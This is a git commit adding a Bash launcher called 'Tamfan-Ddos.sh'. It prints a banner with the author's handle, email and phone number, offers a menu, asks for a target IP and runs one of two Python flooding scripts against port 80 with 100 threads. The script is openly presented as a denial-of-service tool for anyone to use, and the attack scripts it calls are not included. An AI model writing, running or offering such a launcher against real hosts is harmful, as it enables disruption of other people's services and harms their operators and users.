63ad4ffc3d15775540d81374dc54c8840ef68a97
MrUncle <50101968+MrTamfanX@users.noreply.github.com>
2019-05-10 04:28:10 +0700

    Add files via upload

---
+++ Tamfan-Ddos.sh
@@ -0,0 +1,47 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f slant " DDOS TAMFAN TROJAN " |lolcat
+echo
+echo
+echo $blue"---------------------------------------"
+echo $blue"AUTOUR  :MrTamfanX / MrTamfanX Cyber Team "
+echo $blue"VERSION :1.0"
+echo $blue"JUDUL     :DDOS TAMFAN TROJAN "
+echo $red"---------------------------------------"
+echo $green"?Contact :masterhc64@gmail.com         "
+echo $green"?WhatsApp :+6285779515200              "
+echo $red"---------------------------------------"
+echo $yellow"                 OMOM"
+echo $red"---------------------------------------"
+echo $white"[1].TAMFAN TROJAN"
+echo $white"[2].TAMFAN DROID"
+echo $red"---------------------------------------"
+echo $red"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " TAMFAN TROJAN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " TAMFAN DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
